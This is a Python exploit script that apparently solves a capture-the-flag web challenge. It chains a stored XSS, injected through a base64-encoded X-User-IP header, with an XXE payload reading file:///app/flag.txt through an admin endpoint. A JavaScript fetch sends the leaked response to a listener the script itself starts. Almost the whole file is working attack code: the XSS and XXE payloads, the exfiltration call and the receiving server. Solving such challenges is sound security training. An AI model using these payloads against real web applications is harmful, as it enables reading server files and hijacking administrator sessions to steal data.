import base64
import os
import threading

import requests
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = os.environ.get("SERVICE_WEB_APP_HTTP_HOST", "127.0.0.1")
PORT = os.environ.get("SERVICE_WEB_APP_HTTP_PORT", "5000")
BASE_URL = f"http://{HOST}:{PORT}"

# Two vulnerabilities, chained, matching the author's own README writeup.
#
# 1. Stored XSS: /contact's handler reads an attacker-supplied X-User-IP
#    header, base64-decodes it into `raw_user_ip`, then immediately
#    re-encodes it with the *same* base64 scheme before storing it as the
#    submission's `user_ip` column. The email/title/message form fields are
#    escaped via markupsafe, but submission.html renders the resulting
#    `user_ip` with the Jinja `|safe` filter -- completely unescaped. So any
#    plaintext we send as base64(payload) in X-User-IP round-trips exactly
#    back out as raw, executable HTML/JS whenever the submission page is
#    viewed (both the public /submission/<id> and admin-only
#    /admin/contact/<id> pages share the same template).
#
# 2. XXE: POST /admin/contacts (admin-only, but also the exact endpoint the
#    admin-bot's own page JS calls) parses the request body as XML with
#    lxml's `resolve_entities=True`, then always echoes
#    "You searched for: <submitted email>" back in its response -- even when
#    there are zero DB matches. Supplying a DOCTYPE with an external general
#    entity resolving to file:///app/flag.txt makes the "email" text equal
#    the flag file's contents, which then appears verbatim in the response.
#
# Submitting a contact form automatically triggers an admin-bot visit to
# http://web-app:5000/admin/contact/<submission_id> (already logged in as
# admin). Our stored XSS there performs the XXE POST (now carrying the
# bot's own admin session cookie) and exfiltrates the resulting response
# text to our own tiny HTTP server.

exfil_event = threading.Event()
exfil_data = {"value": None}


class _ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/exfil"):
            from urllib.parse import urlparse, parse_qs

            qs = parse_qs(urlparse(self.path).query)
            data = qs.get("d", [""])[0]
            if data:
                exfil_data["value"] = data
                exfil_event.set()
        self.send_response(200)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


def start_http_server():
    server = ThreadingHTTPServer(("0.0.0.0", 8000), _ExfilHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()


def own_reachable_address():
    import socket

    return socket.gethostbyname(socket.gethostname())


def main():
    start_http_server()
    own_exfil_url = f"http://{own_reachable_address()}:8000/exfil"

    xxe_payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE search [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>'
        "<search><email>&xxe;</email></search>"
    )

    xss_payload = f"""<script>
fetch('/admin/contacts', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/xml'}},
    body: {xxe_payload!r}
}}).then(r => r.text()).then(t => {{
    fetch('{own_exfil_url}?d=' + encodeURIComponent(t));
}});
</script>"""

    x_user_ip = base64.b64encode(xss_payload.encode("utf-8")).decode("ascii")

    r = requests.post(
        f"{BASE_URL}/contact",
        data={"email": "attacker@example.com", "title": "hi", "message": "hi"},
        headers={"X-User-IP": x_user_ip},
        timeout=15,
    )
    r.raise_for_status()
    print("Contact form submitted, bot should visit shortly.")

    if not exfil_event.wait(timeout=60):
        raise SystemExit("timed out waiting for the admin bot to trigger the XXE and exfiltrate")

    leaked = exfil_data["value"]
    print("Leaked response text:")
    print(leaked)

    match = None
    for line in leaked.splitlines():
        if line.startswith("You searched for: "):
            match = line[len("You searched for: "):].strip()
            break
    if not match:
        raise SystemExit(f"Could not find flag content in leaked response: {leaked!r}")

    print("FLAG:", match)


if __name__ == "__main__":
    main()
